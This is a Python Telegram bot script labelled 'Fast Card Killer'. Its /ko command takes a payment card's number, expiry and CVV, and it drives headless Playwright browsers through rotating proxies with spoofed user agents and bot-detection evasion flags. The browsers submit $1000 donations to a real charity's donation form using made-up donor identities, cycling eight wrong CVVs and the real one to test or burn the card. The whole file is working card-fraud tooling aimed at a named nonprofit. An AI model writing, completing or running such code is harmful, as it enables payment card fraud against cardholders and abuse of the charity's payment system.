import asyncio
import os
import random
import logging
from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes
from playwright.async_api import async_playwright
import nest_asyncio
nest_asyncio.apply()

TOKEN = os.getenv("TOKEN")
if not TOKEN:
    raise ValueError("TOKEN environment variable not set!")

TARGET_URL = "https://giving.mclean.org/#gf_18"
AMOUNT = "1000"
DESIGNATION_TEXT = "The McLean Fund"
PROXY_FILE = "proxies.txt"
MAX_CONCURRENT = 2  # RAM ke hisaab se kam
TIMEOUT = 30000      # 30 sec

def load_proxies():
    try:
        with open(PROXY_FILE, 'r') as f:
            proxies = [line.strip() for line in f if line.strip()]
            # Filter out invalid entries (like "Unknown" or empty)
            return [p for p in proxies if ':' in p and not p.startswith('#')]
    except:
        return []

FIRST_NAMES = ["John","Mary","Robert","Jennifer","Michael","Linda","William","Barbara"]
LAST_NAMES = ["Smith","Johnson","Williams","Brown","Jones","Garcia","Miller","Davis"]
STREETS = ["123 Main St","456 Oak Ave","789 Pine Rd","321 Elm St","987 Maple Dr"]
CITIES = ["Boston","New York","Chicago","Los Angeles","Miami","Houston","Phoenix"]
STATES = ["MA","NY","IL","CA","FL","TX","AZ"]
ZIPS = ["02101","10001","60601","90001","33101","77001","85001"]
EMAIL_DOMAIN = ["gmail.com","yahoo.com","outlook.com","protonmail.com"]

def random_donor():
    return {
        "first": random.choice(FIRST_NAMES),
        "last": random.choice(LAST_NAMES),
        "email": f"{random.choice(FIRST_NAMES).lower()}{random.randint(1,999)}@{random.choice(EMAIL_DOMAIN)}",
        "address": random.choice(STREETS),
        "city": random.choice(CITIES),
        "state": random.choice(STATES),
        "zip": random.choice(ZIPS)
    }

async def attempt_parallel(card, exp_month, exp_year, cvv, attempt_cvv, donor, proxy=None, retry=2):
    """Single attempt with retry logic"""
    for attempt in range(retry + 1):
        try:
            async with async_playwright() as p:
                browser = await p.chromium.launch(
                    headless=True,
                    args=[
                        '--disable-blink-features=AutomationControlled',
                        '--disable-dev-shm-usage',
                        '--no-sandbox',
                        '--disable-web-security',
                        '--disable-features=IsolateOrigins,site-per-process',
                        '--disable-gpu'
                    ]
                )
                context_kwargs = {
                    'user_agent': random.choice([
                        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
                    ])
                }
                if proxy:
                    context_kwargs['proxy'] = {"server": f"http://{proxy}"}
                context = await browser.new_context(**context_kwargs)
                page = await context.new_page()
                
                # Set extra timeouts
                page.set_default_timeout(TIMEOUT)
                
                # Navigate with wait until 'networkidle'
                await page.goto(TARGET_URL, wait_until='networkidle', timeout=TIMEOUT)
                
                # Wait for form - try multiple selectors
                selectors = [
                    "input#input_18_16_1",
                    "input[name='input_18_16_1']",
                    "input[placeholder*='Card']",
                    "input[autocomplete='cc-number']"
                ]
                found = False
                for sel in selectors:
                    try:
                        await page.wait_for_selector(sel, timeout=5000)
                        found = True
                        break
                    except:
                        continue
                if not found:
                    raise Exception("Card number field not found")
                
                # Fill amount
                await page.click("input[name='input_18_1'][value='1000']")
                # Designation
                await page.select_option("select#input_18_2", label=DESIGNATION_TEXT)
                # Donor
                await page.fill("input#input_18_3_3", donor["first"])
                await page.fill("input#input_18_3_6", donor["last"])
                await page.fill("input#input_18_4", donor["email"])
                await page.select_option("select#input_18_5_1", label="United States")
                await page.fill("input#input_18_5_4", donor["address"])
                await page.fill("input#input_18_5_5", donor["city"])
                await page.select_option("select#input_18_5_6", label=donor["state"])
                await page.fill("input#input_18_5_7", donor["zip"])
                # Card
                await page.fill("input#input_18_16_1", card)
                await page.fill("input#input_18_16_2_month", exp_month.zfill(2))
                await page.fill("input#input_18_16_2_year", exp_year[-2:])
                await page.fill("input#input_18_16_3", attempt_cvv)
                
                # Submit and wait for response
                async with page.expect_response(lambda r: "gf_ajax" in r.url or "gform" in r.url, timeout=TIMEOUT) as resp:
                    await page.click("input#gform_submit_button_18")
                response = await resp.value
                body = await response.text()
                await context.close()
                await browser.close()
                return (attempt_cvv, response.status, body[:200])
        except Exception as e:
            if attempt < retry:
                await asyncio.sleep(random.uniform(2,5))
                continue
            else:
                return (attempt_cvv, None, f"Error: {str(e)}")
    return (attempt_cvv, None, "All retries failed")

async def kill_card_fast(card, exp_month, exp_year, cvv):
    sem = asyncio.Semaphore(MAX_CONCURRENT)
    
    async def limited_attempt(attempt_cvv, donor, proxy):
        async with sem:
            return await attempt_parallel(card, exp_month, exp_year, cvv, attempt_cvv, donor, proxy)
    
    wrong = set()
    while len(wrong) < 8:
        w = str(random.randint(100,999)).zfill(3)
        if w != cvv:
            wrong.add(w)
    attempts = list(wrong) + [cvv]
    donor = random_donor()
    proxies = load_proxies() or [None]*9
    tasks = []
    for attempt_cvv in attempts:
        proxy = random.choice(proxies) if proxies else None
        tasks.append(limited_attempt(attempt_cvv, donor, proxy))
    return await asyncio.gather(*tasks)

async def ko_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        await update.message.reply_text("❌ Use: /ko card|month|year|cvv")
        return
    raw = " ".join(context.args)
    parts = raw.split('|')
    if len(parts) == 4:
        card, month, year, cvv = [p.strip() for p in parts]
    else:
        tokens = raw.split()
        if len(tokens) >= 4:
            card, month, year, cvv = tokens[0], tokens[1], tokens[2], tokens[3]
        else:
            await update.message.reply_text("❌ Parse error. Example: /ko 4867960083635846|02|2031|149")
            return
    await update.message.reply_text(f"⚡ Killing {card} (parallel {MAX_CONCURRENT}, retries on fail)...")
    results = await kill_card_fast(card, month, year, cvv)
    report = "\n".join([f"CVV {cvv} -> Status: {st}, Body: {body[:100]}" for cvv, st, body in results])
    await update.message.reply_text(f"✅ Done.\n\n{report}")

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("🔥 Fast Card Killer (parallel, retry, proxy fallback)\nUse /ko card|month|year|cvv")

def main():
    app = Application.builder().token(TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("ko", ko_command))
    app.run_polling(drop_pending_updates=True)

if __name__ == "__main__":
    main()
